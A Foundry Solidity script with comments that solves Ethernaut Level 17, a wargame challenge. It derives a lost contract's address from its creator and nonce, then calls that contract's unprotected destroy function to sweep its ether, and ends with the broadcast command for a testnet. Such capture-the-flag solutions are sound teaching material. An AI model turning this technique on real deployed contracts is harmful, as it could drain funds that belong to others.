// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level17Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

// Ethernaut Level 17 is a challenge that involves recovering ether from a contract that has been created at a deterministic address. The contract in question is a SimpleToken contract that has been deployed by the Recovery contract. The goal is to recover the ether stored in the SimpleToken contract by finding/recovering the contract at the same address, which will allow you to access the funds.
// Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).
// Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.
// An interesting blog post (https://swende.se/blog/Ethereum_quirks_and_vulns.html) by Martin Swende details potential use cases of this.
// If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.

contract Player {
    receive() external payable {}
}

contract Level17Solution is Script {
    Recovery public recovery =
        Recovery(0xb6EBe3e7c5C8C87C6185EA56f041Bae024A99246);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        SimpleToken simpleToken = SimpleToken(
            payable(getAddressFromCreatorAddress(address(recovery)))
        );

        console.log("Balance before:", address(simpleToken).balance);

        simpleToken.destroy(payable(address(new Player())));

        console.log("Balance after:", address(simpleToken).balance);

        vm.stopBroadcast();
    }
}

// This is the address of the SimpleToken contract created by the Recovery contract
// It is derived from the creator contract's address and the nonce of the creator.
// Or simply get the address from Etherscan by observing the transactons of the Recovary contract :)
function getAddressFromCreatorAddress(address creator) pure returns (address) {
    return
        address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            creator,
                            bytes1(0x01) // Nonce 1 (the first contract created/deployed by the Recovery contract)
                        )
                    )
                )
            )
        );
}

// forge script script/Level17Solution.s.sol:Level17Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
